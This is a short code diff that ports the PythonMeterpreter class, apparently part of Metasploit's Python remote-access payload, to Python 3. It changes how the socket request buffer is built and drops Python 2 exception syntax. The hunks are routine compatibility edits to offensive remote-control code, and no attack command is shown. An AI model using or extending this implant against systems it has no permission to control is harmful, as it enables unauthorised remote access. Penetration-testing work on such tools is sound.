@@ -16,6 +16,9 @@ import subprocess
 import sys
 import threading
 
+if sys.version_info[0] < 3:
+	bytes = str
+
 #
 # Constants
 #
@@ -286,7 +289,7 @@ class PythonMeterpreter(object):
 					break
 				req_length, req_type = struct.unpack('>II', request)
 				req_length -= 8
-				request = ''
+				request = bytes()
 				while len(request) < req_length:
 					request += self.socket.recv(4096)
 				response = self.create_response(request)
@@ -487,7 +490,7 @@ class PythonMeterpreter(object):
 			try:
 				#print("[*] running method {0}".format(handler_name))
 				result, resp = handler(request, resp)
-			except Exception, err:
+			except Exception:
 				#print("[-] method {0} resulted in an error".format(handler_name))
 				result = ERROR_FAILURE
 		else:
